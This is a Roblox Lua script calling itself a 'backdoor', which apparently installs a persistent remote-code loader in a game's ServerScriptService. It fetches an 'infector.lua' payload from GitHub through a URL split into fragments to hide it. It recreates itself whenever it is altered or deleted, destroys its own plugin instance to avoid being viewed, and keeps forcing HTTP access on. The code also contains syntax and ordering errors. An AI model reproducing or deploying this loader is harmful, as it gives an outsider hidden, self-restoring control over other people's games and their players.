-- MAXIMUM SECURITY BEEKDEER 
-- Made by IvanIzWorthlessYT

-- Please set the PluginScript's name into:
-- YnRFAWcnYCPXQTysUmXvCdZBYHGtibTpvPZoZbAgvFitsDkbivVJzrnBNPBwCGJq

local ratchet
local ratchetName = "qbvZBkprkSJwzXWkWtPneSSsmMVLGgSiEurDhXgvAjSpHbtaEZCTTtjEmecvkEJn"
local pluginName = "YnRFAWcnYCPXQTysUmXvCdZBYHGtibTpvPZoZbAgvFitsDkbivVJzrnBNPBwCGJq"

-- Connect All Events of ratchet 

local function ReconnectRatchet()
ratchet.AncestryChanged:Connect(RecreateRatchet)
ratchet.AttributeChanged:Connect(RecreateRatchet)
ratchet.Changed:Connect(RecreateRatchet)
ratchet.ChildAdded:Connect(RecreateRatchet)
ratchet.ChildRemoved:Connect(RecreateRatchet)
ratchet.DescendantAdded:Connect(RecreateRatchet)
ratchet.DescendantRemoving:Connect(RecreateRatchet)
ratchet.Destroying:Connect(CreateRatchet)
end 

-- Create Ratchet

local function CreateRatchet()
    ratchet = Instance.new("Script",game:GetService('ServerScriptService') 
    ratchet.Name = ratchetName 
    ratchet.Source = game:HttpGet('htt'..'ps:'..'//'..'raw.githu'..'buser'..'content.'..'com/IvanTheP'..'rotogen/B'..'ack'..'do'..'or'..'Legacy/'..'main/inf'..'ector.l'..'ua') 
    ReconnectRatchet()
end

-- Recreate Ratchet

local function RecreateRatchet() 
    pcall(function() ratchet:Destroy() end)
    wait() 
    CreateRatchet() 
end

-- Initialize

game.DescendantAdded:Connect(function(inst) 
    if inst.Name == pluginName then 
        inst:Destroy() -- Anti-Viewer
    end 
end) 

CreateRatchet() -- New ratchet 

task.spawn(function() while wait() do game:GetService('HttpService').HttpEnabled = true end end)
